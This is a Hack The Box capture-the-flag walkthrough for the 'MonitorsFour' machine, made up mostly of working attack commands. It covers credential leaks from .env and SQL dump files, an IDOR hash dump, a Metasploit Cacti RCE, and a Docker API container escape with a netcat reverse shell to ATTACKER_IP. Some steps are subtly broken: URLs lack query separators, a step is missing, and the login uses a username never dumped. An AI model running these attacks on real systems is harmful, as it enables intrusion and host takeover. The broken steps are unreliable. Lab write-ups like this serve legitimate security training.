# MonitorsFour — HTB (Easy)

> **IP:** `TARGET_IP`
> **Domain:** `monitorsfour.htb`
> **Host OS:** Windows 11 Pro (Docker Desktop running Linux containers)
> **Difficulty:** Easy

---

## 1. Initial Reconnaissance

### 1.1 Nmap
Relevant open ports:

```
80/tcp    open  http    nginx
5985/tcp  open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
```

### 1.2 Add host entry
```bash
# What it does: add the target IP and domain to the local hosts file.
# Why here: ensure proper resolution for domain-based virtual host discovery.
echo "TARGET_IP monitorsfour.htb" | sudo tee -a /etc/hosts
```

Possible email target spotted on the site:
```
sales@monitorsfour.htb
```

---

## 2. Web Enumeration

### 2.1 Directory fuzzing
```bash
# What it does: fuzz the web root for common directories.
# Why here: identify potential entry points or exposed application paths like /api or /cacti.
ffuf -u http://monitorsfour.htb/FUZZ \
  -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt
```

### 2.2 API fuzzing
```bash
# What it does: fuzz the API endpoints for hidden functionality.
# Why here: find unprotected or leaked API routes that might expose sensitive data like user hashes or tokens.
ffuf -u http://monitorsfour.htb/api/v1/FUZZ \
  -w /usr/share/wordlists/seclists/Discovery/Web-Content/api/api-endpoints-res.txt
```

Endpoints found:
```
auth      [Status: 405]
logout    [Status: 302]
user      [Status: 200]
users     [Status: 200]
```

### 2.3 Information leak: `.env`
Leaks database credentials:
```
DB_HOST=mariadb
DB_PORT=3306
DB_NAME=monitorsfour_db
DB_USER=monitorsdbuser
DB_PASS=f37p2j8f4t0r
```

### 2.4 Virtual-host enumeration
```bash
# What it does: enumerate virtual hosts using Gobuster.
# Why here: discover subdomains like cacti.monitorsfour.htb that point to internal apps.
gobuster vhost -u http://monitorsfour.htb \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  --append-domain
```

Result:
```
cacti.monitorsfour.htb  Status: 302 [Size: 0] [--> /cacti]
```

---

## 3. Exploitation — Cacti 1.2.28

The identified version is vulnerable to **unauthenticated RCE** (CVE-2025-66399 / SNMP command-injection chain).

### 3.1 Fuzzing `/cacti`
```bash
# What it does: fuzz the /cacti/ directory for common files.
# Why here: search for leaked configuration or backup files within the Cacti installation.
ffuf -u "http://cacti.monitorsfour.htb/cacti/FUZZ" \
  -H "Host: cacti.monitorsfour.htb" \
  -w /usr/share/wordlists/dirb/common.txt \
  -fs 0 -t 50 -c
```

### 3.2 Deeper fuzzing with extensions
```bash
# What it does: perform intensive fuzzing with multiple file extensions.
# Why here: discover sensitive configuration or database dump files like cacti.sql that might contain cleartext credentials.
ffuf -u "http://cacti.monitorsfour.htb/cacti/FUZZ" \
  -H "Host: cacti.monitorsfour.htb" \
  -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt \
  -e .php,.txt,.bak,.old,.sql,.env \
  -c -t 50 -fw 1,604
```

Discovered: `http://cacti.monitorsfour.htb/cacti/cacti.sql`

### 3.3 SQL dump analysis

**Plaintext SNMP v3 credentials** (`automation_snmp_items` table):
```
user:     admin
password: baseball
```

**User hashes** (`user_auth`):
```
admin  :  21232f297a57a5a743894a0e4a801fc3   (MD5 of "admin")
guest  :  43e9a4ab75570f5b                   (enabled!)
```

### 3.4 Leaking users through the API
```bash
# What it does: query the user endpoint with a null token.
# Why here: exploit an IDOR vulnerability in the API to dump all registered user hashes for offline cracking.
curl -s "http://monitorsfour.htb/usertoken=0"
```

Returns all users with their MD5 hashes:
```
admin       : 56b32eb43e6f15395f6c46c1c9e1cd36
mwatson     : 69196959c16b26ef00b77d82cf6eb169
janderson   : 2a22dcf99190c322d974c8df5ba3256b
dthompson   : 8d4a7e7fd08555133e056d9aacb1e519
```

Cracked admin hash:
```
admin : wonderful1
```

Generated API token: `f54b3c9a7fb6fe6ae7`

### 3.5 Login to Cacti
Reusing credentials: **`marcus:wonderful1`** → access to `cacti.monitorsfour.htb`.

---

## 4. RCE with Metasploit

```
msfconsole
use multi/http/cacti_graph_template_rce
set RHOSTS cacti.monitorsfour.htb
set VHOST  cacti.monitorsfour.htb
set TARGET 0          # Linux (container)
set LHOST  tun0
run
sessions -i 1
shell
/bin/bash -i
```

---

## 5. Container Escape → Windows Host

### 5.1 Environment check
```bash
# What it does: check for the presence of the .dockerenv file.
# Why here: confirm if the current shell is running inside a Docker container.
ls /.dockerenv
# What it does: audit the process capabilities.
# Why here: determine if the container has privileged capabilities like CAP_SYS_ADMIN that enable an escape.
cat /proc/self/status | grep CapEff
# What it does: check for the Docker socket file.
# Why here: identify a potential container escape vector through host socket mounting.
ls -la /var/run/docker.sock
```

### 5.2 Open ports inside the container
```bash
netstat -tulpn 2>/dev/null || ss -tulpn 2>/dev/null
```
Detects:
```
tcp  LISTEN  0  4096  *:9000  *:*
```

### 5.3 Unauthenticated Docker API
```bash
# What it does: probe the unauthenticated Docker API.
# Why here: verify if the Docker management port is exposed and identify running containers and images.
curl http://DOCKER_HOST_IP:2375/version
curl http://DOCKER_HOST_IP:2375/containers/json
```

The metadata reveals the project path on the host:
```
"com.docker.compose.project.working_dir": "C:\\Users\\Administrator\\Documents\\docker_setup"
```

### 5.4 Create a privileged container with full disk mount
```bash
# What it does: create a new privileged container via the Docker API.
# Why here: leverage the unauthenticated Docker access to mount the host's C:\ drive into a new container for full host compromise.
curl -X POST -H "Content-Type: application/json" \
  http://DOCKER_HOST_IP:2375/containers/createname=pwned \
  -d '{
    "Image": "alpine:latest",
    "Cmd": ["sleep", "infinity"],
    "HostConfig": {
      "Privileged": true,
      "Binds": ["/mnt/host/c/:/mnt/windows"]
    }
  }'
```

### 5.5 Start the container
```bash
# What it does: activate the privileged container.
# Why here: trigger the mount process that exposes the host's Windows partition.
curl -X POST http://DOCKER_HOST_IP:2375/containers/pwned/start
```

### 5.6 Verify the mount
```bash
# What it does: list the host's Windows directory via the container API.
# Why here: verify that the C:\ drive mount is successful and that we have administrative access to host files.
curl -X POST -H "Content-Type: application/json" \
  http://DOCKER_HOST_IP:2375/containers/pwned/exec \
  -d '{
    "Cmd": ["ls", "-la", "/mnt/windows/Users"],
    "AttachStdout": true,
    "AttachStderr": true
  }'
```

### What it does: execute a reverse shell from the privileged container.
# Why here: obtain an interactive root shell from within the newly created container to finish the host escape.
EXEC_ID=$(curl -s -X POST -H "Content-Type: application/json" \
  http://DOCKER_HOST_IP:2375/containers/pwned/exec \
  -d '{"Cmd": ["nc", "ATTACKER_IP", "5555", "-e", "/bin/sh"], "AttachStdout": true, "AttachStderr": true}' \
  | grep -o '"Id":"[^"]*"' | cut -d'"' -f4)

curl -X POST -H "Content-Type: application/json" \
  "http://DOCKER_HOST_IP:2375/exec/$EXEC_ID/start" \
  -d '{"Detach": false, "Tty": false}' --no-buffer &
```

### 5.8 Reading the flag
```bash
# What it does: verify the host disk mount.
# Why here: confirm the Windows C:\ drive is accessible inside the container.
df -h | grep windows
# What it does: read the root flag from the Administrator's desktop.
# Why here: fulfill the final objective after successful host filesystem access.
cat /mnt/windows/Users/Administrator/Desktop/root.txt
```

---

## Lessons Learned

- Always check vulnerable versions of exposed apps (Cacti 1.2.28 → public RCE).
- Docker API on `2375/tcp` without TLS = trivial host RCE.
- On Docker Desktop for Windows, `/mnt/host/c/` inside the container maps to the host's `C:\` drive.
- A `Privileged: true` container with a bind to the host disk is game over.

